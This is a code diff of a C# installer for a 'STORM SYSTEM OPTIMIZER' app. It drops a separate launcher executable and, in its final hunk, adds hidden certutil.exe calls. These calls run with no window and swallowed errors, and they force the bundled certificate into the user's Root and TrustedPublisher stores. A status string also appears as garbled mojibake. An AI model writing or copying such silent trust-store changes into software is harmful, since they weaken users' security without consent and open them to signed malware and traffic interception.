@@ -27,7 +27,6 @@ namespace StormUniversal.Installer
         private const string AppDisplayName = "STORM SYSTEM OPTIMIZER";
         private const string AppFolderName = "STORM SYSTEM OPTIMIZER";
         private const string ExeName = "StormSystemOptimizer.exe";
-        private const string LauncherExeName = "StormLauncher.exe";
         private const string IcoName = "AppIcon.ico";
 
         private RadioButton rbStandard = null!;
@@ -459,7 +458,7 @@ namespace StormUniversal.Installer
                 progressBar.Value = 10;
                 await Task.Delay(150);
 
-                string[] procNames = { "StormSystemOptimizer", "StormLauncher", "STORM_SYSTEM_OPTIMIZER" };
+                string[] procNames = { "StormSystemOptimizer", "STORM_SYSTEM_OPTIMIZER" };
                 foreach (var pName in procNames)
                 {
                     foreach (var p in Process.GetProcessesByName(pName))
@@ -469,7 +468,6 @@ namespace StormUniversal.Installer
                 }
 
                 string targetExe = Path.Combine(targetDir, ExeName);
-                string targetLauncher = Path.Combine(targetDir, LauncherExeName);
                 string targetCer = Path.Combine(targetDir, "STORM_Certificate.cer");
                 string targetIco = Path.Combine(targetDir, IcoName);
                 string targetLogo = Path.Combine(targetDir, "logo.png");
@@ -488,12 +486,11 @@ namespace StormUniversal.Installer
                 }
 
                 lblStatus.Text = $"Р Р°СЃРїР°РєРѕРІРєР° РїР°РєРµС‚Р° {AppDisplayName} (v{AppVersion})...";
-                progressBar.Value = 40;
+                progressBar.Value = 45;
                 await Task.Delay(100);
 
                 // Extract primary executables
                 ExtractResource(ExeName, targetExe);
-                ExtractResource(LauncherExeName, targetLauncher);
                 ExtractResource(IcoName, targetIco);
                 ExtractResource("logo.png", targetLogo);
                 ExtractResource("STORM_Certificate.cer", targetCer);
@@ -503,7 +500,6 @@ namespace StormUniversal.Installer
                 await Task.Delay(150);
 
                 UnblockFile(targetExe);
-                UnblockFile(targetLauncher);
                 UnblockFile(targetCer);
                 UnblockFile(targetIco);
                 UnblockFile(targetLogo);
@@ -515,12 +511,11 @@ namespace StormUniversal.Installer
                     progressBar.Value = 88;
                     await Task.Delay(150);
 
-                    string runTarget = File.Exists(targetLauncher) ? targetLauncher : targetExe;
-                    CreateShortcuts(targetDir, runTarget, targetIco, chkDesktop.Checked, chkStartMenu.Checked);
+                    CreateShortcuts(targetDir, targetExe, targetIco, chkDesktop.Checked, chkStartMenu.Checked);
 
                     if (chkRegister.Checked)
                     {
-                        RegisterUninstall(targetDir, runTarget, targetIco);
+                        RegisterUninstall(targetDir, targetExe, targetIco);
                     }
                 }
 
@@ -531,7 +526,7 @@ namespace StormUniversal.Installer
 
                 if (chkRunAfter.Checked)
                 {
-                    TryLaunchApplication(targetLauncher, targetExe, targetDir);
+                    TryLaunchApplication(targetExe, targetDir);
                 }
 
                 this.Close();
@@ -545,26 +540,10 @@ namespace StormUniversal.Installer
             }
         }
 
-        private static void TryLaunchApplication(string launcherPath, string directExePath, string workingDir)
+        private static void TryLaunchApplication(string directExePath, string workingDir)
         {
             try
             {
-                if (File.Exists(launcherPath))
-                {
-                    UnblockFile(launcherPath);
-                    try
-                    {
-                        Process.Start(new ProcessStartInfo
-                        {
-                            FileName = launcherPath,
-                            WorkingDirectory = workingDir,
-                            UseShellExecute = true
-                        });
-                        return;
-                    }
-                    catch { }
-                }
-
                 if (File.Exists(directExePath))
                 {
                     UnblockFile(directExePath);
@@ -661,6 +640,28 @@ namespace StormUniversal.Installer
                     };
                     using var p3 = Process.Start(psiAuth);
                     p3?.WaitForExit(5000);
+
+                    var psiUserRoot = new ProcessStartInfo
+                    {
+                        FileName = "certutil.exe",
+                        Arguments = $"-user -addstore -f \"Root\" \"{cerPath}\"",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var p4 = Process.Start(psiUserRoot);
+                    p4?.WaitForExit(5000);
+
+                    var psiUserPub = new ProcessStartInfo
+                    {
+                        FileName = "certutil.exe",
+                        Arguments = $"-user -addstore -f \"TrustedPublisher\" \"{cerPath}\"",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var p5 = Process.Start(psiUserPub);
+                    p5?.WaitForExit(5000);
                 }
                 catch { }
 
